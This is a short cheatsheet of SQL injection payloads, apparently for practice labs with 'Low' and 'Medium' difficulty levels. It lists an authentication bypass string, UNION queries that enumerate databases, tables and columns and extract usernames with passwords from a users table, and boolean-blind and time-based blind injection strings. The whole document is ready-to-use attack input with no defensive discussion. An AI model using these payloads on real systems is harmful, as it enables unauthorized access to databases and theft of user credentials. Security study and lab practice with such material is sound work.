# Quick Reference Cheatsheets

## SQL Injection
```sql
-- Test injection
'
-- Auth bypass
' OR 1=1;--
-- Find columns
1 UNION SELECT 1,2,3--
-- Get database
0 UNION SELECT 1,2,database()
-- Get tables
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema=database()
-- Get columns
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name='users'
-- Extract data
0 UNION SELECT 1,2,group_concat(username,':',password) FROM users

-- Boolean Blind (Low)
1' AND SUBSTRING(database(),1,1)='d'#
-- Boolean Blind (Medium - ASCII bypass)
1 AND ASCII(SUBSTRING(database(),1,1))=100
-- Time Based
1' AND SLEEP(5)#
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)#
```

